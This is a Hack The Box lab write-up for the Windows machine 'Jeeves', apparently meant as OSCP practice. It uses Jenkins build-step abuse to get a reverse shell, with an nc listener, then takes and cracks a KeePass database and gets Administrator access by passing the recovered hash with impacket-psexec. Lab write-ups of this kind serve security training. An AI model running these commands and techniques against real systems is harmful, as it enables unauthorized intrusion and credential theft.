+++
author = "Blue Pho3nix"
title = "Jeeves"
categories = ["htb"]
tags = [ "Medium", "Windows", "TJNULL OSCP Prep" ]
image = "jeeves-icon.png"
+++

![](content/post/htb-jeeves/intro.png)

## Description

> Jeeves is a fun box that starts with error messages. We directory fuzz with ffuf and find Jenkins running. We gain a foothold with a modifying project exploit that gets us a reverse shell as the user. We see the administrator's hash in the user's KeePass, which gives us a shell with psexec. We get the root flag after discovering the hidden file on the server.

## Skills Learned

- Jenkins Modifying Project exploit
- KeePass hacking

# Solution

## Finding the vulnerability

`nmap` shows open ports 80, 135,445, and 50000. <br>
[Video timestamp 0:10](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=10s)

```python
nmap -Pn -p- --min-rate=1000 -T4 10.10.10.63 -vv -oN ports
```

![](content/post/htb-jeeves/1.png)

We run `-sCV` on the open ports.

```python
ls
```

```python
ports=$(cat ports | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
```

```python
echo $ports
```

![](content/post/htb-jeeves/2.png)

```python
nmap -p$ports 10.10.10.63 -sCV -oN version-basescripts
```

![](content/post/htb-jeeves/3.png)

---

We try to login to SMB, but it requires a password. <br>
[Video timestamp 0:15](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=15s)

```shell
smbclient -N -L \\\\10.10.10.63\\
```

![](content/post/htb-jeeves/9.png)

---

Port 50000 gives the 404 Not Found error listed with nmap. <br>
[Video timestamp 0:25](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=25s)

![](content/post/htb-jeeves/4.png)

---

Port 80 also gives an error, this time as an image. <br>
[Video timestamp 0:32](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=32s)

![](content/post/htb-jeeves/5.png)

![](content/post/htb-jeeves/6.png)

![](content/post/htb-jeeves/7.png)

![](content/post/htb-jeeves/8.png)

---

We run `ffuf` and find a `/askjeeves` directory on port 50000 that's running Jenkins. <br>
[Video timestamp 1:40](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=100s)

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.10.63:50000/FUZZ -recursion -recursion-depth 1 -o ffuf
```

![](content/post/htb-jeeves/10.png)

![](content/post/htb-jeeves/11.png)

## Foothold

We find a RCE exploit for Jenkins at [Jenkins RCE Creating Modifying Project](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security/jenkins-rce-creating-modifying-project) <br>
[Video timestamp 2:19](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=139s)

1. Create a `New Item`

![](content/post/htb-jeeves/12.png)

2. `Enter an item Name`, choose `freestyle project`, and click `OK`.

![](content/post/htb-jeeves/13.png)

3. Scroll down to build and add the `Execute Windows batch command` build step.

![](content/post/htb-jeeves/14.png)
![](content/post/htb-jeeves/15.png)

4. Create a `PoweShell #3 base64` encoded reverse shell at [https://www.revshells.com/](https://www.revshells.com/)

![](content/post/htb-jeeves/16.png)

5. Paste the rev shell into `Command` and click `Apply`.

![](content/post/htb-jeeves/17.png)

6. Start your listener with `rwlrap`

```python
rlwrap -cAr nc -lvnp <your chosen port>
```

7. Navigate to `http://10.10.10.63:50000/askjeeves/job/<your job's name>/` and click `Build Now`. This gives us a shell as user kohsuke.

![](content/post/htb-jeeves/18.png)

We get the user flag on `c:\users\kohsuke\desktop`. <br>
[Video timestamp 4:19](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=259s)

```cmd
dir c:\users\
```

![](content/post/htb-jeeves/19.png)

```cmd
cd c:\users\kohsuke\desktop
```

```cmd
dir
```

![](content/post/htb-jeeves/20.png)

---

## Privilege Escalation

We look around and find a `KeePass`file in the `c:\users\kohsuke\documents`directory. <br>
[Video timestamp 4:28](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=268s)

```cmd
cd ..\Documents
```

```cmd
dir
```

![](content/post/htb-jeeves/21.png)

---

We move the file over to our attack box with base64 in powershell. <br>
[Video timestamp 4:40](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=280s)

**On Windows:**

```powershell
[Convert]::ToBase64String((Get-Content -path "C:\users\kohsuke\documents\ceh.kdbx" -Encoding byte))
```

![](content/post/htb-jeeves/22.png)

**On our attack box:**

```python
echo "A9mimmf7S7UBAAMAAhAAMcHy5r9xQ1C+WAUhavxa/wMEA<snip>" | base64 -d > CEH.kdbx
```

![](content/post/htb-jeeves/23.png)

We have `CEH.kdbx` on our local machine.

```python
ls
```

![](content/post/htb-jeeves/24.png)

![](content/post/htb-jeeves/25.png)

---

We use `kpcli` to get the passwords. <br>
[Video timestamp 5:37](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=337s)

```python
sudo apt update && sudo apt install kpcli
```

We need the `CEH.kdbx` master password.

```python
kpcli
```

```shell
open CEH.kdbx
```

![](content/post/htb-jeeves/26.png)

`keepass2john` helps us out.

```python
keepass2john CEH.kdbx > CEH.kdbx-hash
```

![](content/post/htb-jeeves/27.png)

Then we use `john` to get the master password.

```python
john CEH.kdbx-hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![](content/post/htb-jeeves/28.png)

Now it's time to grab the passwords from this `CEH.kdbx` file.

```python
kpcli
```

```shell
open CEH.kdbx
```

After entering the `moonshine1` password we find 7 password entries.

```
find .
```

![](content/post/htb-jeeves/29.png)

We find a hash in entry `0`

```
show -f 0
```

We put the hash in a file for Pass The Hash attacks.

```python
echo "aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00" > hashes
```

![](content/post/htb-jeeves/30.png)

---

We use `crackmapexec` to test the hash on the smb server. We find out the hash works on administrator. <br>
[Video timestamp 7:17](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=437s)

```python
crackmapexec smb 10.10.10.63 --local-auth -u Administrator -H hashes
```

![](content/post/htb-jeeves/31.png)

---

We use `impacket-psexec` to get on the server as Administrator. <br>
[Video timestamp 7:32](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=452s)

```python
impacket-psexec Administrator@10.10.10.63 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

![](content/post/htb-jeeves/32.png)

---

Instead of a root flag, we find `hm.txt`. <br>
[Video timestamp 7:51](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=471s)

```cmd
cd c:\users\administrator\desktop
```

```cmd
dir
```

![](content/post/htb-jeeves/33.png)

The file says `"The flag is elsewhere. Look deeper"` .

```cmd
type hm.txt
```

![](content/post/htb-jeeves/34.png)

Let's look deeper into the `hm.txt` file, then.

```cmd
dir /r
```

![](content/post/htb-jeeves/35.png)

---

We read the `root.txt`stream with `CMD` or `PowerShell`. <br>
[Video timestamp 8:21](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=501s)

**CMD:**

```cmd
more < hm.txt:root.txt:$DATA
```

**PowerShell:**

```powershell
powershell Get-Content hm.txt -stream root.txt
```

![](content/post/htb-jeeves/36.png)
